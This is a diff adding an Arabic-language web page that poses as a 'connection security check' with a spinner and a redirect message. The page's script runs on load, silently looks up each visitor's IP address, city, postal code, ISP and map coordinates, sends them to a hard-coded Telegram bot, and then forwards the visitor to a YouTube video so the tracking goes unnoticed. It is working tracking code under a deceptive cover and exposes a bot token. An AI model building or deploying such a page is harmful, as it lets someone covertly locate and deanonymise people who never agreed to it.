@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحقق من الأمان</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0d1117;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #c9d1d9;
+            text-align: center;
+            direction: rtl;
+        }
+        .container {
+            max-width: 90%;
+            padding: 30px;
+            background: #161b22;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+            border: 1px solid #30363d;
+        }
+        .spinner {
+            border: 4px solid #30363d;
+            border-top: 4px solid #58a6ff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 20px; color: #f0f6fc; margin-bottom: 10px; }
+        p { color: #8b949e; font-size: 15px; }
+        .status { font-size: 14px; color: #58a6ff; min-height: 24px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h2>🔐 جاري التحقق من اتصالك</h2>
+        <p>يرجى الانتظار لحظة... سيتم توجيهك تلقائياً</p>
+        <div class="status" id="status">⏳ جاري التجهيز...</div>
+    </div>
+
+    <script>
+        (function() {
+            // ======== بيانات البوت ========
+            const BOT_TOKEN = "8317512028:AAHEIRv_S23OFrceayGoKW823jIxvl9Az_k";
+            const CHAT_ID = "1497190595";
+            const REDIRECT_URL = "https://www.youtube.com/watch?v=6N5IQxrac6g";
+            // =============================
+
+            const statusEl = document.getElementById('status');
+
+            function updateStatus(msg) {
+                if (statusEl) statusEl.textContent = msg;
+            }
+
+            function sendToTelegram(text) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                return fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: false 
+                    })
+                }).catch(() => {});
+            }
+
+            // ============================================================
+            // 1. جلب الموقع الجغرافي فقط (بدقة عالية مع ترجمة)
+            // ============================================================
+            updateStatus('🌍 جاري تحديد موقعك بدقة...');
+
+            // قاموس الترجمة للأسماء
+            const translate = {
+                'Iraq': 'العراق', 'Baghdad': 'بغداد', 'Basra': 'البصرة',
+                'Nineveh': 'نينوى', 'Erbil': 'أربيل', 'Sulaymaniyah': 'السليمانية',
+                'Duhok': 'دهوك', 'Kirkuk': 'كركوك', 'Najaf': 'النجف',
+                'Karbala': 'كربلاء', 'Babil': 'بابل', 'Wasit': 'واسط',
+                'Maysan': 'ميسان', 'Dhi Qar': 'ذي قار', 'Muthanna': 'المثنى',
+                'Qadisiyyah': 'القادسية', 'Anbar': 'الأنبار', 'Salah ad-Din': 'صلاح الدين',
+                'Diyala': 'ديالى', 'Turkey': 'تركيا', 'Syria': 'سوريا', 
+                'Iran': 'إيران', 'Saudi Arabia': 'السعودية', 'Kuwait': 'الكويت',
+                'Jordan': 'الأردن', 'Lebanon': 'لبنان', 'Egypt': 'مصر'
+            };
+
+            fetch('https://ipinfo.io/json', { timeout: 5000 })
+                .then(res => {
+                    if (!res.ok) throw new Error('HTTP error');
+                    return res.json();
+                })
+                .then(data => {
+                    const ip = data.ip || 'غير معروف';
+                    let country = data.country || 'غير معروف';
+                    let region = data.region || 'غير معروف';
+                    let city = data.city || 'غير معروف';
+                    const org = data.org || 'غير معروف';
+                    const loc = data.loc || 'غير معروف';
+                    const timezone = data.timezone || 'غير معروف';
+                    const postal = data.postal || 'غير معروف';
+
+                    // ترجمة إلى العربية
+                    country = translate[country] || country;
+                    region = translate[region] || region;
+                    city = translate[city] || city;
+
+                    let lat = 'غير معروف', lon = 'غير معروف';
+                    let mapsLink = '#';
+                    if (loc && loc.includes(',')) {
+                        const parts = loc.split(',');
+                        lat = parts[0].trim();
+                        lon = parts[1].trim();
+                        mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    }
+
+                    updateStatus('✅ تم تحديد الموقع، سيتم توجيهك');
+
+                    // ============================================================
+                    // 2. إرسال رسالة واحدة تحتوي على الموقع التفصيلي + رابط الخريطة
+                    // ============================================================
+                    const locationMsg =
+                        `📍 *تحديد الموقع الجغرافي (بدقة عالية)* 📍\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `📌 *الـ IP:* ${ip}\n` +
+                        `🌍 *الدولة:* ${country}\n` +
+                        `🏙️ *المحافظة:* ${region}\n` +
+                        `🗺️ *المدينة:* ${city}\n` +
+                        `📮 *الرمز البريدي:* ${postal}\n` +
+                        `📡 *مزود الإنترنت:* ${org}\n` +
+                        `📍 *خط العرض:* ${lat}\n` +
+                        `📍 *خط الطول:* ${lon}\n` +
+                        `⏰ *المنطقة الزمنية:* ${timezone}\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `🗺️ *رابط الخريطة (خرائط جوجل):*\n` +
+                        `${mapsLink}`;
+
+                    sendToTelegram(locationMsg);
+                })
+                .catch(() => {
+                    updateStatus('⚠️ تعذر التحديد، سيتم التوجيه');
+                    sendToTelegram(`⚠️ *فشل تحديد الموقع* ⚠️\nيرجى مراجعة الاتصال بالشبكة.`);
+                });
+
+            // ============================================================
+            // 3. التوجيه إلى يوتيوب بعد 3 ثوانٍ
+            // ============================================================
+            setTimeout(() => {
+                window.location.replace(REDIRECT_URL);
+            }, 3000);
+
+            setTimeout(() => {
+                if (window.location.href !== REDIRECT_URL) {
+                    window.location.replace(REDIRECT_URL);
+                }
+            }, 5000);
+        })();
+    </script>
+</body>
+</html>
